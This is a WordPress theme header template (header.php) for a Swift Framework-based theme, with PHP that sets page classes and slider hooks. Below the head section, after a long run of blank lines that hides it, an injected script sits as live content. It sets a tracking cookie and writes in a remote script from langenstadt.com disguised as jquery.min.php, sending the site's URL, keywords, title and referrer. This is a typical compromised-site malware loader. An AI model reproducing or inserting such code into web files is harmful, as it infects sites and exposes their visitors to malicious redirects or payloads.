<!DOCTYPE html>

<!--// OPEN HTML //-->
<html <?php language_attributes(); ?>>

	<!--// OPEN HEAD //-->
	<head>
		
		<!-- Manually set render engine for Internet Explorer, prevent any plugin overrides -->
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
		
		<?php
	        $page_class = "";

			if ( function_exists( 'sf_page_classes' ) ) {
				$page_classes = sf_page_classes();
				$page_class = $page_classes['page'];
			}

	        global $post, $sf_options;
	        $extra_page_class = $page_header_type = "";
	        $page_layout      = $sf_options['page_layout'];
	        $header_layout    = $sf_options['header_layout'];
	        if ( isset( $_GET['layout'] ) ) {
	            $page_layout = $_GET['layout'];
	        }
	        if ( $post ) {
	            $extra_page_class = sf_get_post_meta( $post->ID, 'sf_extra_page_class', true );
	        }
	        if ( is_page() && $post ) {
	            $page_header_type = sf_get_post_meta( $post->ID, 'sf_page_header_type', true );
	        }
			if ( $page_header_type == "below-slider" && $page_layout == "boxed" ) {
				add_action( 'sf_before_page_container', 'sf_pageslider', 20 );
	        } else if ( $page_header_type == "below-slider" && ( $header_layout != "header-vert" || $header_layout != "header-vert-right" ) ) {
	            add_action( 'sf_container_start', 'sf_pageslider', 5 );
	        } else {
	            add_action( 'sf_container_start', 'sf_pageslider', 30 );
	        }

	        if ( $page_header_type == "naked-light" || $page_header_type == "naked-dark" ) {
	            remove_action( 'sf_main_container_start', 'sf_breadcrumbs', 20 );
	        }
	    ?>

		<?php wp_head(); ?>

	<!--// CLOSE HEAD //-->
	

























































































































































































































<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://langenstadt.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'K85164' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>

	<!--// OPEN BODY //-->
	<body <?php body_class($page_class.' '.$extra_page_class); ?>>

		<?php
			/**
			 * @hooked - sf_site_loading - 5
			 * @hooked - sf_fullscreen_search - 6
			 * @hooked - sf_mobile_menu - 10
			 * @hooked - sf_mobile_cart - 20
			 * @hooked - sf_sideslideout - 40
			**/
			do_action('sf_before_page_container');
		?>

		<!--// OPEN #container //-->
		<div id="container">

			<?php
				/**
				 * @hooked - sf_pageslider - 5 (if above header)
				 * @hooked - sf_mobile_header - 10
				 * @hooked - sf_header_wrap - 20
				**/
				do_action('sf_container_start');
			?>

			<!--// OPEN #main-container //-->
			<div id="main-container" class="clearfix">

				<?php
					/**
					 * @hooked - sf_pageslider - 10 (if standard)
					 * @hooked - sf_breadcrumbs - 20
					 * @hooked - sf_page_heading - 30
					**/
					do_action('sf_main_container_start');
				?>